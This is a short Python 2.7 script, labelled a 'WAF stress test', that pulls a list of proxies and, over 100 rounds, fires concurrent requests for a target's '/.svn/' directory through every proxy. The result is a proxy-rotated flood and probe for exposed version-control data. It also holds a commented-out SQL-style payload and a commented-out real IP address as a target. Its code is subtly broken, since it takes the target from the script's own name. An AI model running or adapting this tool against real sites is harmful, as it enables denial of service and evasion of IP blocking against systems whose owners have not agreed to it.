#!/usr/bin/env python2.7
#encoding:utf-8
#description:hard WAF Stress Test
#author:k3m

import requests
import gevent
import json
import sys

def get_proxy():
    server_list = []
    file_obj = open('proxy_url.txt', 'r')
    url = file_obj.read()
    file_obj.close()
    response = requests.get(url)
    server_json = json.loads(response.text)
    for one in server_json["data"]["proxy_list"]:
        tmp = {"http": "http://"+one}
        #print tmp
        server_list.append(tmp)
    return server_list

def attack_test(target, proxy):
    #timeout is 3 seconds

    #payload = {'id': 'select 1 from databses;'}
    try:
        r = requests.get(url=target + "/.svn/", timeout=3, verify=False, proxies=proxy)
    except:
        print "error go on"
target = sys.argv[0]
#target = "http://121.15.129.226:9001/"

num = 100
i = 1
for i in range(num):
    server_list = get_proxy()
    tasks=[gevent.spawn(attack_test,target, proxy) for proxy in server_list]
    gevent.joinall(tasks)
